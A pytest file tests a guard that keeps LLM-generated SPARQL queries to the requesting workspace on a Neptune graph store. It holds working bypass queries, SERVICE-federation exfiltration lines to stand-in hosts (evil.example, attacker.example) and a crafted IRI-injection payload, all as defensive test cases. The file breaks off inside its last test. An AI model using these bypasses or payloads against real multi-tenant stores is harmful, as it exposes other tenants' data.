"""Cross-workspace confinement for LLM-GENERATED SPARQL (ONTA-424).

The regression these lock down: ``/ask`` and ``/agent`` generate SPARQL and run
it through the same ``neptune.query()`` the raw passthrough uses. On Neptune the
default graph is the union of every named graph, so a generated query that
forgot its ``FROM`` clause read every other workspace and returned an answer that
looked completely normal. ``nlp/prompts.py`` TEACHES the model to scope its
queries; until this change nothing ENFORCED it.

Two properties are asserted throughout, and the second is the important one:

1. Nothing unconfined reaches the store. Rejection tests assert the store was
   never called, not merely that the response looked empty.
2. Repair produces a query that a PARSER agrees is scoped, re-derived
   independently of the guard's own bookkeeping. Asserting "the guard returned a
   string" would pass against a repair that inserted ``FROM`` inside a string
   literal, which is precisely the failure mode that would leave the leak open
   while every test stayed green.

The three historical bypasses that defeated earlier revisions of the raw-route
guard are replayed here against the generated-query guard, because it reuses the
same parser-based extractor and would inherit any regression in it.
"""

from unittest.mock import AsyncMock

import pytest

from cograph_client.graph.sparql_scope import (
    CrossTenantQueryError,
    TenantScopeError,
    confine_generated_query,
    is_global_layer_graph,
    tenant_of_graph,
)

TENANT = "test-tenant"
OWN_GRAPH = f"https://graph.onta.sh/graphs/{TENANT}"
DATA_GRAPH = f"{OWN_GRAPH}/kg/imdb"
VICTIM_GRAPH = "https://graph.onta.sh/graphs/victim-tenant"
PUBLIC_LAYER = "https://graph.onta.sh/graphs/global/public"
ENHANCED_LAYER = "https://graph.onta.sh/graphs/global/enhanced"


def _confine(sparql: str, **kw) -> str:
    kw.setdefault("default_graphs", [DATA_GRAPH])
    kw.setdefault("tenant_id", TENANT)
    return confine_generated_query(sparql, **kw)


def _dataset_of(sparql: str) -> list[str]:
    """Re-derive the dataset with the PARSER, independently of the guard.

    The guard saying "scoped" proves only that the guard is happy. What has to
    be true is that the STORE will confine the query, and the gap between those
    two is where every bypass in this module's history lived.
    """
    from rdflib.plugins.sparql.parser import parseQuery

    from cograph_client.graph.sparql_scope import dataset_graphs

    return dataset_graphs(parseQuery(sparql)[1])


# ---------------------------------------------------------------------------
# The hole itself
# ---------------------------------------------------------------------------


def test_generated_query_with_no_dataset_clause_is_repaired_not_run_bare():
    """The reported leak: a generated query naming no graph at all.

    Neptune reads the union of every named graph for this query. The user asked
    a question and wrote no SPARQL, so the fix is to scope it, not to fail them.
    """
    out = _confine("SELECT ?s ?p ?o WHERE { ?s ?p ?o }")
    assert _dataset_of(out) == [DATA_GRAPH]


def test_repair_is_verified_by_the_parser_not_by_string_insertion():
    """A repair that lands anywhere ungrammatical must be refused, not shipped."""
    out = _confine(
        'SELECT ?n WHERE { ?s <https://graph.onta.sh/types/Film/attrs/name> ?n . '
        'FILTER(CONTAINS(LCASE(?n), "where the wild things are")) }'
    )
    assert _dataset_of(out) == [DATA_GRAPH]
    # The literal must survive intact: a repair inserted INSIDE it would still
    # parse as a query, just a different one.
    assert '"where the wild things are"' in out


def test_repair_handles_the_where_less_group_graph_pattern():
    """`SELECT * { ... }` is legal SPARQL: the WHERE keyword is optional."""
    out = _confine("SELECT * { ?s ?p ?o }")
    assert _dataset_of(out) == [DATA_GRAPH]


def test_repair_does_not_disturb_an_already_scoped_query():
    query = f"SELECT ?s FROM <{DATA_GRAPH}> WHERE {{ ?s ?p ?o }}"
    assert _confine(query) == query


def test_a_query_scoped_to_another_kg_in_the_same_workspace_is_left_alone():
    """Within-workspace is not a leak, so it is neither repaired nor rejected.

    Repairing it would union a second KG into an answer the route scoped to one
    — a semantics change smuggled in under a security guard. Picking the right
    KG within a workspace is a separate concern with a separate fix.
    """
    other = f"{OWN_GRAPH}/kg/events"
    query = f"SELECT ?s FROM <{other}> WHERE {{ ?s ?p ?o }}"
    assert _confine(query) == query
    assert _dataset_of(_confine(query)) == [other]


# ---------------------------------------------------------------------------
# Foreign graphs: hard-fail, never repaired
# ---------------------------------------------------------------------------


def test_foreign_dataset_clause_is_a_security_event_not_a_repair():
    with pytest.raises(CrossTenantQueryError) as err:
        _confine(f"SELECT ?s FROM <{VICTIM_GRAPH}> WHERE {{ ?s ?p ?o }}")
    assert err.value.status_code == 403
    assert "victim-tenant" in err.value.detail


def test_foreign_graph_is_rejected_even_when_the_owned_graph_is_also_named():
    """Adding our own graph must not launder a foreign one alongside it."""
    with pytest.raises(CrossTenantQueryError):
        _confine(
            f"SELECT ?s FROM <{DATA_GRAPH}> FROM <{VICTIM_GRAPH}> "
            "WHERE { ?s ?p ?o }"
        )


def test_foreign_graph_in_an_inline_graph_block_is_rejected():
    """Rule B: the raw-text scan, in any syntactic position."""
    with pytest.raises(CrossTenantQueryError):
        _confine(
            f"SELECT ?s FROM <{DATA_GRAPH}> WHERE "
            f"{{ GRAPH <{VICTIM_GRAPH}> {{ ?s ?p ?o }} }}"
        )


def test_repair_can_never_widen_scope_beyond_the_requests_own_graphs():
    """The invariant behind the design decision, checked over every input here.

    Repair only ever ADDS ``default_graphs``. There is no input for which it
    removes, rewrites or "corrects" a clause the generator produced, so a
    cross-workspace clause cannot be repaired into an accepted query. Every
    output's dataset is therefore a subset of the graphs the request was already
    scoped to plus whatever in-scope graphs the model named itself.
    """
    in_scope = {DATA_GRAPH, OWN_GRAPH, f"{OWN_GRAPH}/kg/events", PUBLIC_LAYER}
    accepted = [
        "SELECT ?s ?p ?o WHERE { ?s ?p ?o }",
        "SELECT * { ?s ?p ?o }",
        f"SELECT ?s FROM <{DATA_GRAPH}> WHERE {{ ?s ?p ?o }}",
        f"SELECT ?s FROM <{OWN_GRAPH}> WHERE {{ ?s ?p ?o }}",
        f"SELECT ?s FROM <{OWN_GRAPH}/kg/events> WHERE {{ ?s ?p ?o }}",
        f"SELECT ?s FROM <{PUBLIC_LAYER}> WHERE {{ ?s ?p ?o }}",
        f"SELECT ?s FROM <{DATA_GRAPH}> FROM <{PUBLIC_LAYER}> WHERE {{ ?s ?p ?o }}",
    ]
    for query in accepted:
        out = _confine(query, allowed_graphs=[PUBLIC_LAYER])
        graphs = _dataset_of(out)
        assert graphs, f"accepted a query the parser reports as unscoped: {query}"
        assert set(graphs) <= in_scope, (query, graphs)
        # And the request's own data graph is always reachable after repair.
        assert DATA_GRAPH in graphs or set(graphs) <= in_scope - {PUBLIC_LAYER}

    rejected = [
        f"SELECT ?s FROM <{VICTIM_GRAPH}> WHERE {{ ?s ?p ?o }}",
        f"SELECT ?s FROM <{DATA_GRAPH}> FROM <{VICTIM_GRAPH}> WHERE {{ ?s ?p ?o }}",
        f"SELECT ?s WHERE {{ GRAPH <{VICTIM_GRAPH}> {{ ?s ?p ?o }} }}",
        f"SELECT ?s FROM <{OWN_GRAPH}-evil> WHERE {{ ?s ?p ?o }}",
        f"SELECT ?s FROM <{OWN_GRAPH}/../victim-tenant> WHERE {{ ?s ?p ?o }}",
    ]
    for query in rejected:
        with pytest.raises(CrossTenantQueryError):
            _confine(query, allowed_graphs=[PUBLIC_LAYER])


# ---------------------------------------------------------------------------
# The three historical bypasses
# ---------------------------------------------------------------------------


def test_bypass_one_blank_node_label_containing_from():
    """v1 was a keyword scan. ``_:b-FROM <g>`` is ONE blank-node token.

    The scanner read a standalone ``FROM`` followed by an owned IRI and called
    the query scoped, while the store saw no dataset clause at all and fell back
    to the union of every graph.
    """
    query = (
        "SELECT ?s ?p ?o WHERE { ?s ?p ?o "
        f"OPTIONAL {{ _:b-FROM <{DATA_GRAPH}> ?z }} }}"
    )
    out = _confine(query)
    # Not rejected — it is a legal, if odd, query. It must be REPAIRED, and the
    # parser must agree the repaired form carries a real dataset clause.
    assert _dataset_of(out) == [DATA_GRAPH]
    assert "_:b-FROM" in out


def test_bypass_two_pn_chars_middle_dot_before_from():
    """v2 tightened the scanner's lookbehind. U+00B7 is a legal PN_CHARS.

    ``ex:p·FROM`` walked straight through the tightened regex.
    """
    query = (
        "PREFIX ex: <http://example.com/> "
        f"SELECT ?o WHERE {{ ?s ex:p·FROM <{DATA_GRAPH}> . ?s ?p ?o }}"
    )
    out = _confine(query)
    assert _dataset_of(out) == [DATA_GRAPH]


def test_bypass_three_prefixed_name_dataset_clause_is_refused_not_dropped():
    """v3 parsed, then filtered the dataset to its ``URIRef`` values.

    ``parseQuery`` leaves a PrefixedName dataset clause UNEXPANDED, so the filter
    dropped it and reported the query as scoped to its owned clause alone while
    the store read both. ``PN_LOCAL_ESC`` lets the prefix be split anywhere, so
    the literal text ``https://graph.onta.sh/graphs/`` never appears and the
    raw-text rule is blind too. The extractor must be TOTAL: refuse, never drop.
    """
    query = (
        "PREFIX g: <https://graph.onta.sh/gr> "
        f"SELECT * FROM <{DATA_GRAPH}> FROM g:aphs\\/victim-tenant "
        "WHERE { ?s ?p ?o }"
    )
    from rdflib.plugins.sparql.parser import parseQuery

    assert len(parseQuery(query)[1]["datasetClause"]) == 2, "parser must see both"

    with pytest.raises(TenantScopeError) as err:
        _confine(query)
    assert err.value.status_code == 400


def test_service_federation_is_rejected_in_a_generated_query():
    """Outbound exfiltration, reachable through the same call."""
    with pytest.raises(TenantScopeError) as err:
        _confine(
            f"SELECT ?s FROM <{DATA_GRAPH}> WHERE "
            "{ SERVICE <http://evil.example/sparql> { ?s ?p ?o } }"
        )
    assert err.value.status_code == 400


def test_unparseable_generated_query_is_refused_rather_than_repaired():
    with pytest.raises(TenantScopeError) as err:
        _confine("SELECT ?s WHERE { ?s ?p")
    assert err.value.status_code == 400


# ---------------------------------------------------------------------------
# Global ontology layers
# ---------------------------------------------------------------------------


def test_visible_global_layers_are_readable_but_do_not_count_as_scoping():
    """A query naming only shared SCHEMA is not scoped to the tenant's DATA."""
    out = _confine(
        f"SELECT ?s FROM <{PUBLIC_LAYER}> WHERE {{ ?s ?p ?o }}",
        allowed_graphs=[OWN_GRAPH, PUBLIC_LAYER],
    )
    assert set(_dataset_of(out)) == {PUBLIC_LAYER, DATA_GRAPH}


def test_layer_aware_query_passes_through_untouched():
    """The shape ``add_layer_from_clauses`` actually produces on the ask path."""
    query = (
        f"SELECT ?s FROM <{DATA_GRAPH}> FROM <{OWN_GRAPH}> FROM <{PUBLIC_LAYER}> "
        "WHERE { ?s ?p ?o }"
    )
    assert _confine(query, allowed_graphs=[OWN_GRAPH, PUBLIC_LAYER]) == query


def test_a_layer_not_visible_to_this_tenant_is_still_rejected():
    """Entitlement, not just tenancy: Enhanced is out of scope unless allowed."""
    query = f"SELECT ?s FROM <{DATA_GRAPH}> FROM <{ENHANCED_LAYER}> WHERE {{ ?s ?p ?o }}"
    with pytest.raises(CrossTenantQueryError):
        _confine(query, allowed_graphs=[OWN_GRAPH, PUBLIC_LAYER])
    # Entitled tenant: same query, allowed.
    assert _confine(query, allowed_graphs=[PUBLIC_LAYER, ENHANCED_LAYER]) == query


def test_a_one_shot_allowlist_survives_the_repair_re_entry():
    """The repair path re-enters the function, so a generator must not be lost.

    ``allowed_graphs`` is typed as an Iterable. A caller passing a generator
    would have it exhausted by the first pass and see an EMPTY allowlist on the
    second, which 403s a legitimate layer-aware query. Fail-closed but wrong,
    and only on the repair path, which is where a bug like this hides.
    """
    layers = (g for g in (OWN_GRAPH, PUBLIC_LAYER))
    out = _confine(
        f"SELECT ?s FROM <{PUBLIC_LAYER}> WHERE {{ ?s ?p ?o }}", allowed_graphs=layers
    )
    assert set(_dataset_of(out)) == {PUBLIC_LAYER, DATA_GRAPH}


def test_an_allowlist_cannot_smuggle_in_another_workspace():
    """The allowlist admits shared schema, never a second workspace's data.

    Without the structural filter, any caller that could influence
    ``allowed_graphs`` would have a second route to exactly the hole this module
    closes.
    """
    with pytest.raises(CrossTenantQueryError):
        _confine(
            f"SELECT ?s FROM <{VICTIM_GRAPH}> WHERE {{ ?s ?p ?o }}",
            allowed_graphs=[VICTIM_GRAPH],
        )


def test_global_layer_recognition_refuses_escapes():
    assert is_global_layer_graph(PUBLIC_LAYER)
    assert is_global_layer_graph(f"{PUBLIC_LAYER}/v3")
    assert not is_global_layer_graph("https://graph.onta.sh/graphs/global/")
    assert not is_global_layer_graph("https://graph.onta.sh/graphs/global/../victim")
    assert not is_global_layer_graph("https://graph.onta.sh/graphs/global/%2e%2e/x")
    assert not is_global_layer_graph(VICTIM_GRAPH)


# ---------------------------------------------------------------------------
# Caller-side contract
# ---------------------------------------------------------------------------


def test_tenant_is_derived_from_the_route_resolved_data_graph():
    assert tenant_of_graph(DATA_GRAPH) == TENANT
    assert tenant_of_graph(OWN_GRAPH) == TENANT
    assert tenant_of_graph(f"{OWN_GRAPH}/kg/x/provenance") == TENANT
    # Global layers name no workspace, and neither does a foreign namespace.
    assert tenant_of_graph(PUBLIC_LAYER) is None
    assert tenant_of_graph("http://example.org/graph") is None
    # Anything tenant_owns_graph would refuse to round-trip names no workspace.
    assert tenant_of_graph(f"{OWN_GRAPH}/../victim-tenant") is None
    assert tenant_of_graph("https://graph.onta.sh/graphs/") is None


def test_confinement_still_applies_when_no_tenant_can_be_derived():
    """Self-hosted store with its own naming: no tenant boundary in the URI.

    ``None`` must NOT read as "nothing to enforce". The unscoped-read leak is a
    property of the STORE, not of our namespace, so the query still has to name
    the graphs the request targets — and with no ownership rule available that
    is strictly TIGHTER than the tenanted case, not looser.
    """
    graph = "http://example.org/graph"
    out = confine_generated_query(
        "SELECT ?s ?p ?o WHERE { ?s ?p ?o }",
        default_graphs=[graph],
        tenant_id=None,
    )
    assert _dataset_of(out) == [graph]

    with pytest.raises(CrossTenantQueryError):
        confine_generated_query(
            f"SELECT ?s FROM <{VICTIM_GRAPH}> WHERE {{ ?s ?p ?o }}",
            default_graphs=[graph],
            tenant_id=None,
        )


def test_a_target_graph_outside_the_authorized_tenant_is_refused():
    """Caller bug, and the one shape where repairing would CREATE the leak."""
    with pytest.raises(CrossTenantQueryError):
        confine_generated_query(
            "SELECT ?s ?p ?o WHERE { ?s ?p ?o }",
            default_graphs=[VICTIM_GRAPH],
            tenant_id=TENANT,
        )


def test_no_target_graph_at_all_is_refused():
    with pytest.raises(TenantScopeError):
        confine_generated_query(
            "SELECT ?s ?p ?o WHERE { ?s ?p ?o }", default_graphs=[], tenant_id=TENANT
        )


# ---------------------------------------------------------------------------
# The pipeline actually calls it
# ---------------------------------------------------------------------------


def _pipeline():
    from cograph_client.nlp.pipeline import NLQueryPipeline

    return NLQueryPipeline(AsyncMock(), "test-key")


def test_pipeline_helper_confines_with_the_tenant_derived_from_the_data_graph():
    out = _pipeline()._confine_generated(
        "SELECT ?s ?p ?o WHERE { ?s ?p ?o }", DATA_GRAPH, [OWN_GRAPH, PUBLIC_LAYER]
    )
    assert _dataset_of(out) == [DATA_GRAPH]

    with pytest.raises(CrossTenantQueryError):
        _pipeline()._confine_generated(
            f"SELECT ?s FROM <{VICTIM_GRAPH}> WHERE {{ ?s ?p ?o }}", DATA_GRAPH
        )


@pytest.mark.asyncio
async def test_ask_never_sends_an_unscoped_generated_query_to_the_store():
    """End to end through ``ask()``: the wiring, not just the rule.

    The generator returns exactly the query that leaked in production — a
    ``SELECT`` naming no graph. The store must receive a scoped one, and the
    scope must be the KG graph the ROUTE resolved, re-derived by the parser.
    """
    from unittest.mock import patch

    from cograph_client.nlp import pipeline as pipeline_mod
    from cograph_client.nlp.pipeline import NLQueryPipeline

    seen: list[str] = []

    async def query(sparql, *a, **k):
        seen.append(sparql)
        return {"head": {"vars": ["name"]}, "results": {"bindings": []}}

    neptune = AsyncMock()
    neptune.query = AsyncMock(side_effect=query)
    p = NLQueryPipeline(neptune, "invented-anthropic-key")
    p._openrouter_key = ""

    gen = AsyncMock(
        return_value={
            "sparql": "SELECT ?s ?p ?o WHERE { ?s ?p ?o }",
            "explanation": "",
            "functions_needed": [],
        }
    )
    with patch.object(pipeline_mod, "get_embedding_service", return_value=None), patch.object(
        p, "_fetch_ontology", new=AsyncMock(return_value="ONTOLOGY")
    ), patch.object(p, "_generate_sparql", new=gen), patch.object(
        p, "_fetch_parent_map", new=AsyncMock(return_value={})
    ):
        result = await p.ask("how many things", OWN_GRAPH, DATA_GRAPH)

    assert seen, "the pipeline never reached the store"
    for sparql in seen:
        graphs = _dataset_of(sparql)
        assert graphs, f"an unscoped query reached the store: {sparql}"
        assert set(graphs) <= {DATA_GRAPH}, sparql
    # The repaired query is what gets reported back, so the answer's `sparql`
    # field is the query that actually ran.
    assert DATA_GRAPH in result.sparql


@pytest.mark.asyncio
async def test_ask_hard_fails_on_a_generated_cross_workspace_query():
    """No retry, no repair, no store call. ``/ask`` degrades at its boundary."""
    from unittest.mock import patch

    from cograph_client.nlp import pipeline as pipeline_mod
    from cograph_client.nlp.pipeline import NLQueryPipeline

    neptune = AsyncMock()
    p = NLQueryPipeline(neptune, "invented-anthropic-key")
    p._openrouter_key = ""

    gen = AsyncMock(
        return_value={
            "sparql": f"SELECT ?s FROM <{VICTIM_GRAPH}> WHERE {{ ?s ?p ?o }}",
            "explanation": "",
            "functions_needed": [],
        }
    )
    with patch.object(pipeline_mod, "get_embedding_service", return_value=None), patch.object(
        p, "_fetch_ontology", new=AsyncMock(return_value="ONTOLOGY")
    ), patch.object(p, "_generate_sparql", new=gen):
        with pytest.raises(CrossTenantQueryError):
            await p.ask("how many things", OWN_GRAPH, DATA_GRAPH)

    neptune.query.assert_not_called()
    # And it was not fed back to the model as retry advice it could iterate on.
    assert gen.await_count == 1


def test_ask_route_degrades_and_never_forwards_the_foreign_query(
    client, auth_headers, mock_neptune
):
    """The route contract survives the hard fail: a 200 NLResult, no leak.

    ``/ask`` always returns an NLResult, so a confinement failure must not turn
    into a bare 500 — and, more importantly, the foreign graph must never appear
    in anything handed to the store. Asserting only on the response body would
    pass against a mock that returns nothing while the real store returned the
    other workspace's rows.
    """
    from unittest.mock import AsyncMock as _AsyncMock
    from unittest.mock import patch

    from cograph_client.models.query import NLResult

    generated = {
        "sparql": f"SELECT ?s FROM <{VICTIM_GRAPH}> WHERE {{ ?s ?p ?o }}",
        "explanation": "",
        "functions_needed": [],
    }
    with patch(
        "cograph_client.nlp.pipeline.NLQueryPipeline._generate_sparql",
        new_callable=_AsyncMock,
    ) as gen, patch(
        "cograph_client.nlp.pipeline.NLQueryPipeline._fetch_ontology",
        new_callable=_AsyncMock,
    ) as onto:
        gen.return_value = generated
        onto.return_value = "ONTOLOGY"
        res = client.post(
            f"/graphs/{TENANT}/ask",
            json={"question": "how many things"},
            headers=auth_headers,
        )

    assert res.status_code == 200
    NLResult(**res.json())
    # The ROUTE's degraded message, not the pipeline's "after N attempts" one:
    # this pins that the error PROPAGATED rather than being retried three times
    # with the model iterating against its own rejection.
    assert "internal error" in res.json()["answer"]
    assert not res.json()["sparql"]
    for call in mock_neptune.query.await_args_list + mock_neptune.query.call_args_list:
        assert VICTIM_GRAPH not in str(call), call


#: Store calls in ``nlp/pipeline.py`` that pass a BARE VARIABLE holding SPARQL
#: this module built itself, with a justification for why each is confined by
#: construction. Deliberately keyed on the variable NAME so adding a new one is
#: a decision someone has to write down here, not something a rename can slip
#: past. Anything else must go through ``_confine_generated``.
BUILT_HERE_QUERY_VARS = {
    # `_resolve_anchor_via_neptune`: an f-string template that carries its own
    # `FROM <data_graph>`, with the description sanitised into a FILTER literal.
    # A literal inside the WHERE cannot introduce a dataset clause: the grammar
    # puts DatasetClause* before the WhereClause.
    "anchor_query": "f-string template carrying its own FROM <data_graph>",
    # `_fetch_ontology` / `_instance_graph_ontology_fallback`: templates over
    # `FROM <instance_graph>` / `FROM <target_graph>`.
    "type_query": "f-string template carrying its own FROM",
    "pred_query": "f-string template carrying its own FROM",
    # `_scan_instance_types` (ONTA-427): template over `FROM <instance_graph>`.
    "type_scan_query": "f-string template carrying its own FROM <instance_graph>",
    # `_fetch_ontology`'s enum probes: templates over `FROM <instance_graph>`.
    "count_query": "f-string template carrying its own FROM <instance_graph>",
    "enum_values_query": "f-string template carrying its own FROM <instance_graph>",
    # `_resolve_uri_labels`: template scoped to `FROM <data_graph>` (ONTA-424),
    # whose interpolated IRIs are additionally filtered by
    # `_is_interpolatable_iri` so a LITERAL that merely starts with the entity
    # prefix cannot close the IRI and inject syntax (notably a SERVICE call).
    "label_query": "template: FROM <data_graph> + IRIREF-safe interpolation",
}

#: Query BUILDERS whose output is scoped by construction, so a store call that
#: passes one directly needs no confinement. An explicit list rather than a
#: ``*_query`` naming convention: a convention exempts anything a future author
#: happens to name that way, including a builder that is not actually scoped,
#: which is the enumerated-allowlist failure mode in reverse.
BUILT_HERE_QUERY_BUILDERS = {
    "parent_map_query": "graph/ontology_queries: emits FROM <graph_uri>",
    "get_full_ontology_query": "graph/ontology_queries: emits FROM <graph_uri>",
    "_active_type_probe_query": "pipeline-local: emits FROM <instance_graph>",
    # ONTA-454's subclass-closure confirmation probe. Emits
    # `FROM <ontology graphs> FROM NAMED <kg_graph>`; every GRAPH IRI in it is
    # resolved by the ROUTE for this request, so no caller-supplied graph reaches
    # the dataset clause. Its TYPE IRIs do come from LLM-generated SPARQL, via
    # `referenced_types`, but only in expression/object position and never in a
    # dataset clause: the extracting regex is anchored on the `IRI_BASE/types/`
    # prefix and stops at whitespace or `>`, and a malformed match fails
    # `parseQuery` rather than injecting (the probe then raises and the caller
    # degrades to emitting its caveat, which is the safe direction).
    "kg_subtype_presence_query": "nlp/kg_coverage: emits FROM + FROM NAMED",
}


def _scan_execution_sites(source: str) -> tuple[list[str], list[str]]:
    """``(confined, unconfined)`` store-call sites, deny-by-default.

    Decided on the AST, not on a regex over the text. A regex needs the call to
    fit on one line with a bare identifier inside the parentheses, and the four
    shapes it cannot see are all ordinary Python that already exists in this
    repo: a call wrapped across lines (which is what the formatter does at 88
    columns), ``query(x, timeout=5)`` (the kwargs shape ``api/routes/grep.py``
    already writes), ``query(x.strip())``, and an aliased receiver. A guard a
    code formatter can defeat is not deny-by-default.

    A call is exempt only when its first positional argument is a call to a
    ``*_query`` BUILDER (scoped by construction, e.g.
    ``parent_map_query(graph_uri)``) or a bare ``Name`` listed in
    :data:`BUILT_HERE_QUERY_VARS`. Everything else — any other expression, and
    any name without a written-down justification — must have a
    ``_confine_generated`` call in the eight lines above it. "Any call is fine"
    would be too loose: ``query(generated.strip())`` is a call too.
    """
    import ast

    def _is_builder_call(node) -> bool:
        if not isinstance(node, ast.Call):
            return False
        func = node.func
        name = (
            func.id
            if isinstance(func, ast.Name)
            else func.attr
            if isinstance(func, ast.Attribute)
            else ""
        )
        return name in BUILT_HERE_QUERY_BUILDERS

    def _query_argument(node):
        """The expression carrying the SPARQL, positional or keyword.

        Reading ``node.args[0]`` alone would skip ``query(sparql=x)`` entirely,
        which is not a theoretical shape: it is what anyone writes the moment the
        signature grows a second parameter.
        """
        if node.args:
            return node.args[0]
        for keyword in node.keywords:
            if keyword.arg is not None:
                return keyword.value
        return None

    tree = ast.parse(source)
    lines = source.splitlines()
    confined: list[str] = []
    unconfined: list[str] = []
    for node in ast.walk(tree):
        if not isinstance(node, ast.Call):
            continue
        func = node.func
        # Match on the METHOD name alone, so aliasing the client to a local
        # (`client = self.neptune; client.query(...)`) cannot hide a site.
        if not (isinstance(func, ast.Attribute) and func.attr == "query"):
            continue
        argument = _query_argument(node)
        if argument is None:
            continue
        if _is_builder_call(argument):
            continue
        if isinstance(argument, ast.Name) and argument.id in BUILT_HERE_QUERY_VARS:
            continue
        i = node.lineno - 1
        window = "\n".join(lines[max(0, i - 8) : i])
        (confined if "_confine_generated(" in window else unconfined).append(
            f"line {node.lineno}: {lines[i].strip()}"
        )
    return confined, unconfined


def test_every_generated_sparql_execution_site_is_guarded():
    """Structural guard, mirroring the raw router's own test.

    DENY BY DEFAULT, like ``test_write_path_convergence`` and
    ``test_retrieval_path_convergence``. An earlier draft of this test matched
    the two variable names this change happened to use, which meant a new
    execution site called anything else would sail straight past it — the same
    enumerated-allowlist weakness that let ``api/routes/lambda_functions.py``
    escape the old write-path guard. Every store call in the module is now
    enumerated instead, and anything not justified must be confined.
    """
    import inspect

    from cograph_client.nlp import pipeline as pipeline_mod

    confined, unconfined = _scan_execution_sites(inspect.getsource(pipeline_mod))
    assert not unconfined, (
        "unconfined SPARQL execution in nlp/pipeline.py:\n"
        + "\n".join(unconfined)
        + "\nEither route it through _confine_generated(), or, if it is a query "
        "this module builds with its own FROM clause, add its variable to "
        "BUILT_HERE_QUERY_VARS with a justification."
    )
    assert len(confined) == 3, (
        "the set of confined execution sites changed; confirm each new one is "
        f"correct, then update this count (found {confined})"
    )


@pytest.mark.parametrize(
    "planted",
    [
        # A brand-new variable name. The first draft of this guard matched two
        # hard-coded names and was blind to anything else.
        "generated = build_it()\nraw = await self.neptune.query(generated)",
        # Wrapped across lines. This is what the formatter produces at 88
        # columns, so it is the likeliest real-world miss, and a text regex
        # anchored on one line cannot see it.
        "generated = build_it()\nraw = await self.neptune.query(\n    generated\n)",
        # Keyword arguments after the query. `api/routes/grep.py` already writes
        # this shape, so it is not hypothetical.
        "generated = build_it()\nraw = await self.neptune.query(generated, timeout=5)",
        # An expression rather than a bare name: not a builder call we know, so
        # deny by default.
        "generated = build_it()\nraw = await self.neptune.query(generated.strip())",
        # The receiver aliased to a local, hiding the word `neptune`.
        "client = self.neptune\nraw = await client.query(generated)",
        # A keyword-only first argument. Not theoretical: it is what anyone
        # writes the moment the signature grows a second parameter, and
        # `api/routes/grep.py` already passes kwargs to this method.
        "generated = build_it()\nraw = await self.neptune.query(sparql=generated)",
        # Argument unpacking hides the expression entirely, so deny it.
        "raw = await self.neptune.query(*args)",
        # A builder this module has not vetted. Exemption is an explicit list,
        # not a `*_query` naming convention: a convention would exempt anything
        # a future author happens to name that way, scoped or not.
        "raw = await self.neptune.query(evil_query(x))",
        # Shapes that hide the call from a line-oriented scan.
        "def inner():\n    raw = self.neptune.query(generated)",
        "rows = [await self.neptune.query(g) for g in gs]",
        "raw = await self.neptune.query(g := build_it())",
        "raw = await self.neptune.query(a if b else c)",
    ],
)
def test_the_structural_guard_catches_a_planted_violation(planted):
    """The guard is only worth having if it fails on the thing it describes.

    Five shapes, four of which the earlier text-regex draft could not see. Each
    is ordinary Python that already appears somewhere in this repo, so "nobody
    would write that" is not an argument.
    """
    confined, unconfined = _scan_execution_sites(planted)
    assert unconfined and not confined, planted


def test_the_structural_guard_does_not_cry_wolf():
    """A confined site and a builder call must both stay quiet."""
    renamed = (
        "sparql = self._confine_generated(sparql, data_graph)\n"
        "raw = await self.neptune.query(sparql)"
    )
    confined, unconfined = _scan_execution_sites(renamed)
    assert confined and not unconfined

    # A builder CALL is scoped by construction and needs no allowlist entry,
    # in every argument shape.
    for builder in (
        "raw = await self.neptune.query(parent_map_query(g))",
        "raw = await self.neptune.query(\n    parent_map_query(g),\n)",
        "raw = await self.neptune.query(parent_map_query(g), timeout=5)",
        "raw = await self.neptune.query(sparql=parent_map_query(g))",
        "raw = await self.neptune.query(get_full_ontology_query(g))",
    ):
        assert _scan_execution_sites(builder) == ([], []), builder


@pytest.mark.asyncio
async def test_label_resolution_is_scoped_to_the_requests_own_graph():
    """Entity IRIs carry no tenant segment, so an unscoped label lookup leaks.

    ``entity_uri`` mints ``entities/<Type>/<safe_id>`` from the type and the
    value alone, so two workspaces holding the same real-world thing mint the
    SAME IRI. This lookup named no graph, which on Neptune means the union of
    every named graph, so it returned whatever label ANOTHER workspace attached
    to that IRI and the answer rendered it as ours.
    """
    from cograph_client.nlp.pipeline import NLQueryPipeline

    seen: list[str] = []

    async def query(sparql, *a, **k):
        seen.append(sparql)
        return {"head": {"vars": ["uri", "label"]}, "results": {"bindings": []}}

    neptune = AsyncMock()
    neptune.query = AsyncMock(side_effect=query)
    p = NLQueryPipeline(neptune, "invented-anthropic-key")

    bindings = [{"x": "https://graph.onta.sh/entities/Film/some_film"}]
    await p._resolve_uri_labels(bindings, DATA_GRAPH)

    assert seen, "the label lookup never ran"
    assert _dataset_of(seen[0]) == [DATA_GRAPH]


#: A value that merely STARTS with the entity prefix, then closes the IRI and
#: appends its own graph pattern. Written out in full because the whole point is
#: that it parses cleanly: a test asserting "some bad string is rejected" would
#: pass against a payload that never worked.
SERVICE_INJECTION_VALUE = (
    "https://graph.onta.sh/entities/Film/x> } "
    "SERVICE <http://attacker.example/sparql> "
    "{ ?uri <http://www.w3.org/2000/01/rdf-schema#label> ?label } }#"
)


@pytest.mark.asyncio
async def test_label_lookup_cannot_be_injected_by_a_literal_in_the_graph():
    """A LITERAL is indistinguishable from an IRI by the time we see it.

    ``parse_sparql_results`` flattens every binding to its ``.value`` string, so
    a literal the workspace's own ingest put in the graph reaches the label
    collector looking exactly like an entity IRI. Interpolating it into
    ``<{u}>`` let it close the IRI and append a ``SERVICE`` call: an outbound
    channel from inside the VPC, the same one rule C rejects on the raw route.
    """
    from cograph_client.nlp.pipeline import NLQueryPipeline, _is_interpolatable_iri

    # The payload is only interesting if it really would have worked.
    values_clause = f"<{SERVICE_INJECTION_VALUE}>"
    injected = (
        f"SELECT ?uri ?label FROM <{DATA_GRAPH}> WHERE {{ "
        f"VALUES ?uri {{ {values_clause} }} "
        f"?uri <http://www.w3.org/2000/01/rdf-schema#label> ?label . }}"
    )
    from rdflib.plugins.sparql.parser import parseQuery
    from rdflib.plugins.sparql.parserutils import CompValue

    names: set[str] = set()

    def walk(node):
        if isinstance(node, CompValue):
            names.add(node.name)
            for key in list(node.keys()):
                walk(node[key])
        elif isinstance(node, (list, tuple)):
            for item in node:
                walk(item)

    for part in parseQuery(injected):
        walk(part)
    assert "ServiceGraphPattern" in names, "the payload no longer demonstrates the bug"

    assert not _is_interpolatable_iri(SERVICE_INJECTION_VALUE)

    seen: list[str] = []

    async def query(sparql, *a, **k):
        seen.append(sparql)
        return {"head": {"vars": ["uri", "label"]}, "results": {"bindings": []}}

    neptune = AsyncMock()
    neptune.query = AsyncMock(side_effect=query)
    p = NLQueryPipeline(neptune, "invented-anthropic-key")

